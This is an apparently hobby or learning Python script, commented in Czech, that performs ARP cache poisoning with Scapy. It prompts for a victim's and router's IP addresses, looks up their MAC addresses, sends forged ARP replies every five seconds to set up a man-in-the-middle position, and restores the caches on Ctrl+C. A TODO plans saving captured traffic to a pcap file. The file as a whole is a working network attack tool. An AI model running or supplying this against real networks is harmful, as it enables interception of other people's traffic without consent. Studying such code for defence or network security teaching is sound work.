# spoofer_logic.py - TODO LIST

# 1. TODO: Importovat Scapy (ARP, send, wrpcap)

# 2. TODO: Funkce spoof(target_ip, spoof_ip, target_mac)
#    - Vytvořit falešný ARP paket typu "is-at".
#    - Nastavit psrc na IP routeru, ale odeslat ho na MAC oběti.

# 3. TODO: Funkce restore(target_ip, gateway_ip, target_mac, gateway_mac)
#    - Pošle správné ARP údaje oběti i routeru.
#    - Tím se síť "uzdraví", až vypnete program.

# 4. TODO: Funkce save_capture(packet_list, filename="capture.pcap")
#    - Použít wrpcap() k uložení nasbíraných dat.
from scapy.all import ARP, send, wrpcap, sr1, sr
import time

# --- Config --- #

# Získání ip adresy a mac adresy oběti a routeru
ip_obet = input("Zadejte IP adresu oběti: ")
ip_router = input("Zadejte IP adresu routeru: ")

# Získání MAC adresy oběti a routeru pomocí ARP požadavků
mac_obet = sr1(ARP(pdst=ip_obet), timeout=2, verbose=False).hwsrc
mac_router = sr1(ARP(pdst=ip_router), timeout=2, verbose=False).hwsrc

# Vytvoření falešného ARP paketu pro oběť
arp_obet = ARP(op=2, psrc=ip_router, pdst=ip_obet, hwdst=mac_obet)
arp_router = ARP(op=2, psrc=ip_obet, pdst=ip_router, hwdst=mac_router)

# Restore tabulek
arp_obet_restore = ARP(op=2, psrc=ip_router, hwsrc=mac_router, pdst=ip_obet, hwdst=mac_obet)
arp_router_restore = ARP(op=2, psrc=ip_obet, hwsrc=mac_obet, pdst=ip_router, hwdst=mac_router)



def spoof():

    if mac_obet is None:
        print(f"Nepodařilo se získat MAC adresu oběti ({ip_obet}).")

    if mac_router is None:
        print(f"Nepodařilo se získat MAC adresu routeru ({ip_router}).")

    # Odeslání ARP paketů
    try: 
        while True:
            print(f"Posílám falešné ARP pakety: Ctrl+C pro ukončení.")
            send(arp_obet, verbose=False)
            send(arp_router, verbose=False)
            time.sleep(5)
    except KeyboardInterrupt:
        print("Ukončuji útok, vracím síť do normálu...")
        # Odeslání správných ARP paketů pro obnovení sítě
        sr1(arp_obet_restore, verbose=False, count=5)
        sr1(arp_router_restore, verbose=False, count=5)  # Poslat vícekrát pro jistotu
        print("Síť byla obnovena. Program ukončen.")
